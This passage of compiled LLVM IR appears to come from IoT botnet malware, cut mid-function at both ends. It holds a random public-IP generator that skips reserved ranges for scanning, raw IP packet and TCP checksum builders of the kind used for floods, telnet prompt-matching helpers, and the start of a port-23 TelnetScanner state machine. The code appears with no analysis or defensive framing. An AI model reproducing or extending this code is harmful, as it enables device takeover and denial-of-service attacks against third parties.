  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !4
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #3
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #3
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #3
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @GetRandomPublicIP.ipState.0, align 1
  %5 = tail call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @GetRandomPublicIP.ipState.1, align 1
  %8 = tail call i32 @rand() #3
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @GetRandomPublicIP.ipState.2, align 1
  %11 = tail call i32 @rand() #3
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @GetRandomPublicIP.ipState.3, align 1
  %14 = load i8, i8* @GetRandomPublicIP.ipState.0, align 1
  switch i8 %14, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %15
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %15, %21, %28, %31, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %36
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %17 = icmp eq i8 %16, -88
  br i1 %17, label %.critedge.backedge, label %thread-pre-split35

thread-pre-split35:                               ; preds = %15
  %.pr36 = load i8, i8* @GetRandomPublicIP.ipState.0, align 1
  br label %18

; <label>:18:                                     ; preds = %thread-pre-split35, %.critedge
  %19 = phi i8 [ %.pr36, %thread-pre-split35 ], [ %14, %.critedge ]
  %20 = icmp eq i8 %19, -84
  br i1 %20, label %21, label %25

; <label>:21:                                     ; preds = %18
  %22 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %23 = and i8 %22, -16
  %24 = icmp eq i8 %23, 16
  br i1 %24, label %.critedge.backedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %21
  %.pr = load i8, i8* @GetRandomPublicIP.ipState.0, align 1
  br label %25

; <label>:25:                                     ; preds = %thread-pre-split, %18
  %26 = phi i8 [ %.pr, %thread-pre-split ], [ %19, %18 ]
  %27 = icmp eq i8 %26, 100
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %25
  %29 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %.off = add i8 %29, -64
  %30 = icmp ult i8 %.off, 63
  br i1 %30, label %.critedge.backedge, label %31

; <label>:31:                                     ; preds = %28, %25
  %32 = load i8, i8* @GetRandomPublicIP.ipState.0, align 1
  %33 = icmp eq i8 %32, -87
  %34 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %35 = icmp eq i8 %34, -1
  %or.cond31 = and i1 %33, %35
  br i1 %or.cond31, label %.critedge.backedge, label %36

; <label>:36:                                     ; preds = %31
  %37 = icmp eq i8 %32, -58
  %38 = and i8 %34, -2
  %39 = icmp eq i8 %38, 18
  %or.cond = and i1 %37, %39
  br i1 %or.cond, label %.critedge.backedge, label %40

; <label>:40:                                     ; preds = %36
  %41 = load i8, i8* @GetRandomPublicIP.ipState.0, align 1
  switch i8 %41, label %42 [
    i8 -32, label %.critedge.backedge
    i8 6, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 -41, label %.critedge.backedge
  ]

; <label>:42:                                     ; preds = %40
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %43, i8 0, i64 16, i32 16, i1 false)
  %44 = load i8, i8* @GetRandomPublicIP.ipState.0, align 1
  %45 = zext i8 %44 to i32
  %46 = load i8, i8* @GetRandomPublicIP.ipState.1, align 1
  %47 = zext i8 %46 to i32
  %48 = load i8, i8* @GetRandomPublicIP.ipState.2, align 1
  %49 = zext i8 %48 to i32
  %50 = load i8, i8* @GetRandomPublicIP.ipState.3, align 1
  %51 = zext i8 %50 to i32
  %52 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %43, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.136, i64 0, i64 0), i32 %45, i32 %47, i32 %49, i32 %51)
  %53 = call i32 @inet_addr(i8* nonnull %43) #3
  ret i32 %53
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !5

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #3
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #3
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScanner(i32, i32) local_unnamed_addr #12 {
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %9 = tail call i32 @rand_cmwc()
  %10 = xor i32 %9, %8
  tail call void @srand(i32 %10) #3
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %12, i16* %13, align 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %15 = bitcast i8* %14 to i64*
  store i64 0, i64* %15, align 4
  %16 = tail call noalias i8* @malloc(i64 1025) #3
  tail call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 1025, i32 1, i1 false)
  %17 = zext i32 %1 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %1 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %1, 0
  br i1 %22, label %.lr.ph105.preheader, label %.preheader102.preheader

.lr.ph105.preheader:                              ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph105.prol.loopexit, label %.lr.ph105.prol.preheader

.lr.ph105.prol.preheader:                         ; preds = %.lr.ph105.preheader
  br label %.lr.ph105.prol

.lr.ph105.prol:                                   ; preds = %.lr.ph105.prol.preheader
  %23 = bitcast %struct.telstate_t* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 32, i32 16, i1 false)
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 0, i32 3
  store i8 1, i8* %24, align 1
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 0, i32 9
  store i8* %16, i8** %25, align 8
  br label %.lr.ph105.prol.loopexit

.lr.ph105.prol.loopexit:                          ; preds = %.lr.ph105.preheader, %.lr.ph105.prol
  %indvars.iv106.unr = phi i64 [ 0, %.lr.ph105.preheader ], [ 1, %.lr.ph105.prol ]
  %26 = icmp eq i32 %1, 1
  br i1 %26, label %.preheader102.preheader.loopexit, label %.lr.ph105.preheader.new

.lr.ph105.preheader.new:                          ; preds = %.lr.ph105.prol.loopexit
  br label %.lr.ph105

.lr.ph105:                                        ; preds = %.lr.ph105, %.lr.ph105.preheader.new
  %indvars.iv106 = phi i64 [ %indvars.iv106.unr, %.lr.ph105.preheader.new ], [ %indvars.iv.next107.1, %.lr.ph105 ]
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv106
  %28 = bitcast %struct.telstate_t* %27 to i8*
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 32, i32 16, i1 false)
  %29 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv106, i32 3
  store i8 1, i8* %29, align 1
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv106, i32 9
  store i8* %16, i8** %30, align 8
  %indvars.iv.next107 = add nuw nsw i64 %indvars.iv106, 1
  %31 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next107
  %32 = bitcast %struct.telstate_t* %31 to i8*
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 32, i32 16, i1 false)
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next107, i32 3
  store i8 1, i8* %33, align 1
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv.next107, i32 9
  store i8* %16, i8** %34, align 8
  %indvars.iv.next107.1 = add nsw i64 %indvars.iv106, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next107.1, %wide.trip.count
  br i1 %exitcond.1, label %.preheader102.preheader.loopexit.unr-lcssa, label %.lr.ph105

.preheader102.preheader.loopexit.unr-lcssa:       ; preds = %.lr.ph105
  br label %.preheader102.preheader.loopexit

.preheader102.preheader.loopexit:                 ; preds = %.lr.ph105.prol.loopexit, %.preheader102.preheader.loopexit.unr-lcssa
  br label %.preheader102.preheader

.preheader102.preheader:                          ; preds = %.preheader102.preheader.loopexit, %2
  br label %.preheader102

.preheader102:                                    ; preds = %.preheader102.preheader, %.preheader102
  %indvars.iv = phi i64 [ %indvars.iv.next, %.preheader102 ], [ 0, %.preheader102.preheader ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %35 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %indvars.iv.next
  %36 = load i8*, i8** %35, align 8
  %37 = icmp eq i8* %36, null
  br i1 %37, label %.preheader, label %.preheader102

.preheader:                                       ; preds = %.preheader102
  %38 = icmp sgt i32 %1, 0
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %41 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %38, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %43 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 0
  %44 = sext i32 %0 to i64
  %45 = bitcast i32* %6 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %308
  %.1103 = phi i32 [ %.mux, %308 ], [ 0, %.lr.ph.preheader ]
  %46 = sext i32 %.1103 to i64
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46
  %48 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 7
  %49 = load i32, i32* %48, align 16
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %53

; <label>:51:                                     ; preds = %.lr.ph
  %52 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %52, i32* %48, align 16
  br label %53

; <label>:53:                                     ; preds = %51, %.lr.ph
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 2
  %55 = load i8, i8* %54, align 8
  switch i8 %55, label %308 [
    i8 0, label %56
    i8 1, label %97
    i8 2, label %130
    i8 3, label %149
    i8 4, label %167
    i8 5, label %186
    i8 6, label %204
    i8 7, label %247
  ]

; <label>:56:                                     ; preds = %53
